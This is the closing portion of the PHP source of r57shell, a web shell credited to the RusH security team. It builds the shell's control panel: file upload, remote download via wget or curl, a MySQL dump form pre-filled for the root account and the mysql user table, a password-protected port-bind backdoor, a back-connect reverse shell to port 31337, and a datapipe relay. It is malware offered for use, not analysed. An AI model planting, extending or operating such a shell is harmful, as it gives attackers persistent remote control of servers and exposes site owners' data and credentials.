echo "<form name=upload method=POST ENCTYPE=multipart/form-data>";
echo $table_up1; echo $lang[$language.'_text5']; echo $table_up2;
echo $font;
echo "<b>".ws(7).$lang[$language.'_text6'].$arrow.ws(4)."</b>";
echo "<input type=file name=userfile size=85>&nbsp;";
echo "<br><b>".ws(20).$lang[$language.'_text21'].$arrow.ws(4)."</b>";
echo "<input type=checkbox name=nf1 value=1 id=nf1><input type=text name=new_name size=82>".ws(1);
echo "<input type=hidden name=dir value=".$dir.">";
echo "<input type=submit name=submit value=\" ".$lang[$language.'_butt2']." \">";
echo "</font>";
echo $table_end1;
echo "</form>";
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
/* file upload from remote host form */
if(!$safe_mode&&!$windows){
echo "<form name=remote_upload method=POST>";
echo $table_up1; echo $lang[$language.'_text15']; echo $table_up2;
echo $font;
echo "<b>".ws(13).$lang[$language.'_text16'].$arrow.ws(4)."</b>";
echo "<select size=\"1\" name=\"with\">";
echo "<option value=\"wget\">wget</option>";
echo "<option value=\"fetch\">fetch</option>";
echo "<option value=\"lynx\">lynx</option>";
echo "<option value=\"links\">links</option>";
echo "<option value=\"curl\">curl</option>";
echo "<option value=\"GET\">GET</option>";
echo "</select>&nbsp;<br>";
echo "<b>".ws(7).$lang[$language.'_text17'].$arrow.ws(4)."</b>";
echo "<input type=text name=rem_file value=http:// size=85>".ws(2)."<br>";
echo "<b>".ws(7).$lang[$language.'_text18'].$arrow.ws(4)."</b>";
echo "<input type=text name=loc_file size=85 value=".$dir.">".ws(1);
echo "<input type=hidden name=dir value=".$dir.">";
echo "<input type=submit name=submit value=\" ".$lang[$language.'_butt2']." \">";
echo "</font>";
echo $table_end1;
echo "</form>";
}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
/* mysql dump form */
if($mysql_on)
{
echo "<form name=mysql_dump method=post>";
echo $table_up1; echo $lang[$language.'_text40']; echo $table_up2;
echo $font;
echo "<b>".ws(27).$lang[$language.'_text36'].$arrow.ws(4)."</b>";
echo "<input type=text name=mysql_db size=15 value=";
echo (!empty($_POST['mysql_db'])?($_POST['mysql_db']):("mysql"));
echo ">";
echo "<b>".ws(4).$lang[$language.'_text39'].$arrow.ws(4)."</b>";
echo "<input type=text name=mysql_tbl size=15 value=";
echo (!empty($_POST['mysql_tbl'])?($_POST['mysql_tbl']):("user"));
echo ">";
echo "<b>".ws(4).$lang[$language.'_text37'].$arrow.ws(4)."</b>";
echo "<input type=text name=mysql_l size=15 value=";
echo (!empty($_POST['mysql_l'])?($_POST['mysql_l']):("root"));
echo ">";
echo "<b>".ws(4).$lang[$language.'_text38'].$arrow.ws(1)."</b>";
echo "<input type=text name=mysql_p size=15 value=";
echo (!empty($_POST['mysql_p'])?($_POST['mysql_p']):("password"));
echo ">";
echo "<input type=hidden name=dir size=85 value=".$dir.">";
echo "<input type=hidden name=cmd size=85 value=mysql_dump>";
echo "<br><b>".ws(4).$lang[$language.'_text41'].$arrow.ws(1)."</b>";
echo "<input type=checkbox name=dif value=1 id=dif><input type=text name=dif_name size=85 value=";
echo (!empty($_POST['dif_name'])?($_POST['dif_name']):("dump.sql"));
echo ">".ws(1);
echo ws(4)."<input type=submit name=submit value=\" ".$lang[$language.'_butt9']." \">";
echo "</font>";
echo $table_end1;
echo "</form>";
}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
/* port bind form */
if(!$safe_mode&&!$windows){
echo "<form name=bind method=POST>";
echo $table_up1; echo $lang[$language.'_text9']; echo $table_up2;
echo $font;
echo "<b>".ws(14).$lang[$language.'_text10'].$arrow.ws(4)."</b>";
echo "<input type=text name=port size=15 value=11457>".ws(1);
echo "<b>".ws(6).$lang[$language.'_text11'].$arrow.ws(4)."</b>";
echo "<input type=text name=bind_pass size=15 value=r57>".ws(1);
echo "<b>".ws(6).$lang[$language.'_text20'].$arrow.ws(1)."</b>";
echo "<select size=\"1\" name=\"use\">";
echo "<option value=\"Perl\">Perl</option>";
echo "<option value=\"C\">C</option>";
echo "</select>&nbsp;";
echo "<input type=hidden name=dir value=".$dir.">";
echo ws(6)."<input type=submit name=submit value=\" ".$lang[$language.'_butt3']." \">";
echo "</font>";
echo $table_end1;
echo "</form>";
}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
/* back connect form */
if(!$safe_mode&&!$windows){
echo "<form name=back method=POST>";
echo $table_up1; echo $lang[$language.'_text12']; echo $table_up2;
echo $font;
echo "<b>".ws(22).$lang[$language.'_text13'].$arrow.ws(4)."</b>";
echo "<input type=text name=ip size=15 value=";
echo ((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1"));
echo ">".ws(1);
echo "<b>".ws(37).$lang[$language.'_text14'].$arrow.ws(4)."</b>";
echo "<input type=text name=port size=15 value=31337>&nbsp;";
echo "<b>".ws(6).$lang[$language.'_text20'].$arrow.ws(1)."</b>";
echo "<select size=\"1\" name=\"use\">";
echo "<option value=\"Perl\">Perl</option>";
echo "<option value=\"C\">C</option>";
echo "</select>&nbsp;";
echo "<input type=hidden name=dir value=".$dir.">";
echo ws(6)."<input type=submit name=submit value=\" ".$lang[$language.'_butt4']." \">";
echo "</font>";
echo $table_end1;
echo "</form>";
}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
/* datapipe */
if(!$safe_mode&&!$windows){
echo "<div align=center><form name=datapipe method=POST>";
echo $table_up1; echo $lang[$language.'_text22']; echo $table_up2;
echo $font;
echo "<b>".ws(2).$lang[$language.'_text23'].$arrow.ws(1)."</b>";
echo "<input type=text name=local_port size=5 value=\"31337\">".ws(1);
echo "<b>".ws(2).$lang[$language.'_text24'].$arrow.ws(1)."</b>";
echo "<input type=text name=remote_host size=15 value=\"irc.dalnet.ru\">".ws(1);
echo "<b>".ws(2).$lang[$language.'_text25'].$arrow.ws(1)."</b>";
echo "<input type=text name=remote_port size=5 value=\"6667\">".ws(1);
echo "<b>".ws(2).$lang[$language.'_text26'].$arrow.ws(1)."</b>";
echo "<select size=\"1\" name=\"use\">";
echo "<option value=\"Perl\">datapipe.pl</option>";
echo "<option value=\"C\">datapipe.c</option>";
echo "</select>&nbsp;";
echo ws(2)."<input type=submit name=submit value=\" ".$lang[$language.'_butt5']." \">";
echo "<input type=hidden name=dir value=".$dir.">";
echo "</font>";
echo $table_end1;
echo "</form></div>";
}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
/// end table
echo "</table>";
/* (c) */
echo $table_up3;
echo "<div align=center><font face=Verdana size=-2><b>o---[ r57shell - http-shell by RusH security team | <a href=http://rst.void.ru>http://rst.void.ru</a> | version ".$version." ]---o</b></font></div>";
echo "</td></tr></table>$f";

/* -------------------------[ EOF ]------------------------- */
?>
